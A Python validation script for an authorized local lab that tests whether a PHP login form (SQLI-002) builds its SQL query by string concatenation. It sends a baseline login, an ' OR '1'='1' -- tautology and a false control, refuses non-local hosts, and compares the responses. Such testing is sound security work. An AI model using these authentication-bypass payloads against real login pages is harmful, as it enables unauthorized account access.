#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQLI-002 local validation draft: POST uname/passwd -> SQL string concat.

Scope: local authorized lab only. Refuses non-local hosts, blocks redirects,
does not enumerate the database, and reads only the login response.
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
TIMEOUT_SECONDS = 10.0
LOGIN_MARKER = "Your Login name:"
ERROR_MARKERS = (
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "mysql_fetch_array()",
    "supplied argument is not a valid MySQL",
)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Turn any 3xx into an error so auth jumps are observable, not followed."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(
            req.full_url, code, "redirect blocked -> %s" % newurl, headers, fp)


def validate_target(base_url, path):
    parts = urllib.parse.urlsplit(base_url)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("base-url scheme must be http or https")
    if (parts.hostname or "").lower() not in ALLOWED_HOSTS:
        raise SystemExit("refusing non-local host: %r" % (parts.hostname,))
    if not path.startswith("/"):
        raise SystemExit("path must start with '/'")


def read_cookie(session_file):
    if not session_file:
        return ""
    items = []
    with open(session_file, "r", encoding="utf-8") as handle:
        for raw in handle:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            items.append(line)
    return "; ".join(items)


def post(opener, url, field_user, field_pass, user_value, pass_value):
    body = urllib.parse.urlencode(
        {field_user: user_value, field_pass: pass_value}).encode("utf-8")
    request = urllib.request.Request(url, data=body, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with opener.open(request, timeout=TIMEOUT_SECONDS) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        payload = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, payload
    except urllib.error.URLError as exc:
        return None, "CONNECTION_ERROR: %s" % exc.reason


def observe(status, text):
    return {
        "http_status": status,
        "login_marker": LOGIN_MARKER in text,
        "sql_error_markers": [m for m in ERROR_MARKERS if m in text],
        "body_length": len(text),
    }


def main():
    parser = argparse.ArgumentParser(
        description="SQLI-002 login SQL injection validation draft (local only)")
    parser.add_argument("--base-url", default="http://127.0.0.1")
    parser.add_argument("--path", default="/sqli/SQLI-002.php",
                        help="path to the audited script; adapt to deployment")
    parser.add_argument("--uname-field", default="uname")
    parser.add_argument("--passwd-field", default="passwd")
    parser.add_argument("--session-file", default=None,
                        help="local file holding the Cookie header value lines")
    parser.add_argument("--baseline-user", default="lab_user")
    parser.add_argument("--baseline-pass", default="lab_pass")
    parser.add_argument("--test-user", default="' OR '1'='1' -- ")
    parser.add_argument("--test-pass", default="x")
    parser.add_argument("--control-user", default="' AND '1'='2' -- ")
    args = parser.parse_args()

    validate_target(args.base_url, args.path)
    url = args.base_url.rstrip("/") + args.path
    opener = urllib.request.build_opener(NoRedirect)
    cookie = read_cookie(args.session_file)
    if cookie:
        opener.addheaders = [("Cookie", cookie)]

    cases = (
        ("baseline_valid_account", args.baseline_user, args.baseline_pass),
        ("test_tautology", args.test_user, args.test_pass),
        ("control_false", args.control_user, args.test_pass),
    )
    report = {}
    for name, user_value, pass_value in cases:
        status, text = post(opener, url, args.uname_field, args.passwd_field,
                            user_value, pass_value)
        report[name] = observe(status, text)
        print(json.dumps({"case": name, **report[name]},
                         ensure_ascii=False, sort_keys=True))

    test = report["test_tautology"]
    control = report["control_false"]
    if test["http_status"] is None or control["http_status"] is None:
        print("RESULT: transport failure, no security conclusion", file=sys.stderr)
        return 2
    if test["sql_error_markers"] and not test["login_marker"]:
        print("RESULT: syntax error observed, injectable grammar not confirmed",
              file=sys.stderr)
        return 3
    if test["login_marker"] and not control["login_marker"]:
        print("RESULT: boolean difference consistent with an unparameterized "
              "query; save both raw responses for review")
        return 0
    print("RESULT: no boolean difference observed under these inputs; verify "
          "path, test-account state and comment syntax manually", file=sys.stderr)
    return 4


if __name__ == "__main__":
    sys.exit(main())
